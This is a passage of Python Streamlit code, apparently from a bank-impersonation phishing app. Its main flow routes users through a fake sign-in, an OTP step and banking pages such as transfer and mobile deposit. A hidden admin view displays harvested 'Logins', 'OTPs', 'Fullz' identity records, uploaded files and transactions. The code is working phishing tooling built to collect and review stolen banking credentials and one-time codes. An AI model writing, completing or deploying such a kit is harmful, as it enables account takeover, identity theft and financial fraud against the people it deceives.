    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
    with tabs[0]:
        st.dataframe(pd.DataFrame(state.captured))
    with tabs[1]:
        st.dataframe(pd.DataFrame(state.otp_log))
    with tabs[2]:
        st.json([x for x in state.captured if "fullz" in str(x)])
    with tabs[3]:
        st.write(state.files)
    with tabs[4]:
        st.dataframe(pd.DataFrame(state.tx[:100]))

# ==================== SIDEBAR ====================
def sidebar():
    st.sidebar.markdown(f'<img src="{FLAG_DATA_URI}" width="100">', unsafe_allow_html=True)
    st.sidebar.markdown("---")
    st.sidebar.markdown("Need help? Use Messages to contact support.")
    st.sidebar.markdown("---")
    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Mobile Deposit", "Messages", "Logout"])

# ==================== MAIN FLOW ====================
if not state.auth and not state.admin:
    tab1, tab2 = st.tabs(["Sign In", "Create Account"])
    with tab1: login()
    with tab2: register()
elif state.admin:
    admin()
elif not state.otp_ok:
    otp()
else:
    if st.session_state.get("view") == "checking":
        checking_history()
    elif st.session_state.get("view") == "savings":
        savings_history()
    else:
        page = sidebar()
        if page == "Dashboard": dashboard()
        elif page == "Transfer": transfer()
        elif page == "Mobile Deposit": mobile_deposit()
        elif page == "Messages": messages()
        elif page == "Logout":
            st.session_state.clear()
            st.rerun()
